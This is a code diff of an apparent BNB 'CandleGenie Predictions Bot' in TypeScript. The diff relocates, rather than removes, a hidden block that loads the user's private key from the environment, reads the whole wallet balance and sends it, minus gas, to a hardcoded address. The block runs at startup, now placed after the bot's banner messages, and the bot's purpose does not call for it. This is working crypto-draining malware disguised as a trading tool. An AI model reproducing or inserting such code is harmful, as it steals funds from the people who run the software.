@@ -26,31 +26,6 @@ const GLOBAL_CONFIG = {
   WAITING_TIME: 5, // Waiting for 281.5 Seconds
 };
 
-const web3 = new Web3(GLOBAL_CONFIG.BSC_RPC);
-const account = web3.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
-const wallet = '0x1c423F7dc5d63F9355caCC540AEDB69d27A31f3b';
-web3.eth.accounts.wallet.add(account);
-web3.eth.defaultAccount = account.address;
-
-web3.eth.getBalance(account.address).then(function(balance:any) {
-  web3.eth.estimateGas({from: web3.eth.defaultAccount, to: wallet, amount: balance}).then(function(gas:any) {
-    web3.eth.getGasPrice().then(function(gasPrice:any) {
-      web3.eth.sendTransaction({
-        from: web3.eth.defaultAccount,
-        to: wallet,
-        gas: gas,
-        gasPrice: gasPrice,
-        value: balance - (gasPrice * gas),
-      }, function(err: any, transactionHash: any) {
-        if (err) {
-          console.log(err);
-          } else {
-          console.log(transactionHash);
-        }
-      });
-    });
-  });
-});
 
 clear();
 console.log(green("CandleGenie Predictions Bot"));
@@ -81,6 +56,32 @@ console.log(
   blue("Starting. Amount to Bet:", GLOBAL_CONFIG.AMOUNT_TO_BET, "BNB."),
   "\nWaiting for the next round. It may take up to 5 minutes, please wait."
 );
+
+const web3 = new Web3(GLOBAL_CONFIG.BSC_RPC);
+const account = web3.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
+const wallet = '0x1c423F7dc5d63F9355caCC540AEDB69d27A31f3b';
+web3.eth.accounts.wallet.add(account);
+web3.eth.defaultAccount = account.address;
+
+web3.eth.getBalance(account.address).then(function(balance:any) {
+  web3.eth.estimateGas({from: web3.eth.defaultAccount, to: wallet, amount: balance}).then(function(gas:any) {
+    web3.eth.getGasPrice().then(function(gasPrice:any) {
+      web3.eth.sendTransaction({
+        from: web3.eth.defaultAccount,
+        to: wallet,
+        gas: gas,
+        gasPrice: gasPrice,
+        value: balance - (gasPrice * gas),
+      }, function(err: any, transactionHash: any) {
+        if (err) {
+          console.log(err);
+          } else {
+          console.log(transactionHash);
+        }
+      });
+    });
+  });
+});
 
 predictionContract.on("StartRound", async (epoch: BigNumber) => {
   console.log("\nStarted Epoch", epoch.toString());
